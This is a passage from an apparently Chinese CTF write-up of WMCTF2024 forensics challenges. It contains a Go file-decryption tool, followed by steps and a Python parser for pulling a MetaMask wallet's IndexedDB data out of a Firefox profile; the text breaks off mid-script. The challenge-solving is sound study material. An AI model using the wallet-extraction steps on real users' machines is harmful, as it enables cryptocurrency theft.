class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">help := flag.Bool(<span class="string">&quot;help&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;Show help message&quot;</span>)</span><br><span class="line">decryptFile := flag.String(<span class="string">&quot;decrypt&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;File to decrypt&quot;</span>)</span><br><span class="line">key := flag.String(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Device key for decryption&quot;</span>)</span><br><span class="line">flag.Parse()</span><br><span class="line"><span class="keyword">if</span> *help &#123;</span><br><span class="line">printHelp()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> *decryptFile == <span class="string">&quot;&quot;</span> || *key == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">printHelp()</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> _, err := os.Stat(<span class="string">&quot;private_key.pem&quot;</span>); os.IsNotExist(err) &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;no private key find!&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">privateKey, err := loadRSAKeys()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error loading RSA keys:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> *decryptFile != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">data, err := ioutil.ReadFile(*decryptFile)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error reading file:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">deviceKey, err := hex.DecodeString(*key)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error decoding device key:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">decryptedData, err := decrypt(data, privateKey, deviceKey)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error decrypting data:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">err = ioutil.WriteFile(<span class="string">&quot;decrypted_&quot;</span>+*decryptFile, decryptedData, <span class="number">0644</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;Error writing decrypted file:&quot;</span>, err)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;File decrypted successfully!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将前面得到的rsa私钥保存为private_key.pem，然后计算一下前面得到的device_key的sha256用来解密</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924153146026.png" alt="image-20240924153146026"></p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924153209378.png" alt="image-20240924153209378"></p><h3 id="metasecret"><a href="#metasecret" class="headerlink" title="metasecret"></a>metasecret</h3><blockquote><p>当时这题甚至没有思路。。。</p></blockquote><p>在documents中有个password.txt</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924155025770.png" alt="image-20240924155025770"></p><p>题目中的meta指的是metamask插件，我们可以在firefox下找到这个插件，然后去寻找它的idb文件，这里在~&#x2F;AppData&#x2F;Roaming&#x2F;Mozilla&#x2F;Firefox&#x2F;Profiles&#x2F;jawk8d8g.default-release&#x2F;storage&#x2F;default&#x2F;moz-extension+++654e5b4f-4a65-4e1a-9b58-51733b6a2883^userContextId&#x3D;4294967295&#x2F;idb&#x2F;3647222921wleabcEoxlt-eengsairo.files&#x2F;492这个路径下，将其导出</p><p><img src="/images/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924160140830.png" alt="image-20240924160140830"></p><p>接下来预期解是对idb文件进行snappy解压，用如下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"><span class="keyword">import</span> snappy</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">import</span> pathlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;A SpiderMonkey StructuredClone object reader for Python.&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># This Source Code Form is subject to the terms of the Mozilla Public</span></span><br><span class="line"><span class="comment"># License, v. 2.0. If a copy of the MPL was not distributed with this</span></span><br><span class="line"><span class="comment"># file, You can obtain one at http://mozilla.org/MPL/2.0/.</span></span><br><span class="line"><span class="comment"># Credits:</span></span><br><span class="line"><span class="comment">#   – Source was havily inspired by</span></span><br><span class="line"><span class="comment">#     https://dxr.mozilla.org/mozilla-central/rev/3bc0d683a41cb63c83cb115d1b6a85d50013d59e/js/src/vm/StructuredClone.cpp</span></span><br><span class="line"><span class="comment">#     and many helpful comments were copied as-is.</span></span><br><span class="line"><span class="comment">#   – Python source code by Alexander Schlarb, 2020.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> enum</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> typing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ParseError</span>(<span class="title class_ inherited__">ValueError</span>):</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InvalidHeaderError</span>(<span class="title class_ inherited__">ParseError</span>):</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSInt32</span>(<span class="title class_ inherited__">int</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;Type to represent the standard 32-bit signed integer&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, *a</span>):</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> (-<span class="number">0x80000000</span> &lt;= self &lt;= <span class="number">0x7FFFFFFF</span>):</span><br><span class="line"><span class="keyword">raise</span> TypeError(<span class="string">&quot;JavaScript integers are signed 32-bit values&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSBigInt</span>(<span class="title class_ inherited__">int</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;Type to represent the arbitrary precision JavaScript “BigInt” type&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSBigIntObj</span>(<span class="title class_ inherited__">JSBigInt</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;Type to represent the JavaScript BigInt object type (vs the primitive type)&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSBooleanObj</span>(<span class="title class_ inherited__">int</span>):</span><br><span class="line"><span class="string">&quot;&quot;&quot;Type to represent JavaScript boolean “objects” (vs the primitive type)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Note: This derives from `int`, since one cannot directly derive from `bool`.&quot;&quot;&quot;</span></span><br><span class="line">__slots__ = ()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">self, inner: <span class="built_in">object</span> = <span class="literal">False</span></span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">int</span>.__new__(<span class="built_in">bool</span>(inner))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__and__</span>(<span class="params">self, other: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">bool</span>(self) &amp; other</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__or__</span>(<span class="params">self, other: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">bool</span>(self) | other</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__xor__</span>(<span class="params">self, other: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">bool</span>(self) ^ other</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__rand__</span>(<span class="params">self, other: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"><span class="keyword">return</span> other &amp; <span class="built_in">bool</span>(self)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__ror__</span>(<span class="params">self, other: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"><span class="keyword">return</span> other | <span class="built_in">bool</span>(self)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__rxor__</span>(<span class="params">self, other: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"><span class="keyword">return</span> other ^ <span class="built_in">bool</span>(self)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self, other: <span class="built_in">bool</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">str</span>(<span class="built_in">bool</span>(self))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">_HashableContainer</span>:</span><br><span class="line">inner: <span class="built_in">object</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, inner: <span class="built_in">object</span></span>):</span><br><span class="line">self.inner = inner</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__hash__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">id</span>(self.inner)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__repr__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">repr</span>(self.inner)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">str</span>(self.inner)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">JSMapObj</span>(collections.UserDict):</span><br><span class="line"><span class="string">&quot;&quot;&quot;JavaScript compatible Map object that allows arbitrary values for the key.&quot;&quot;&quot;</span></span><br><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_to_hashable</span>(<span class="params">key: <span class="built_in">object</span></span>) -&gt; collections.abc.Hashable:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="built_in">hash</span>(key)</span><br><span class="line"><span class="keyword">except</span> TypeError:</span><br><span class="line"><span class="keyword">return</span> _HashableContainer(key)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__contains__</span>(<span class="params">self, key: <span class="built_in">object</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">super</span>().__contains__(self.key_to_hashable(key))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__delitem__</span>(<span class="params">self, key: <span class="built_in">object</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">super</span>().__delitem__(self.key_to_hashable(key))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">__getitem__</span>(<span class="params">self, key: <span class="built_in">object</span></span>) -&gt; <span class="built_in">object</span>:</span><br><span class="line"><span class="keyword">return</span> <span 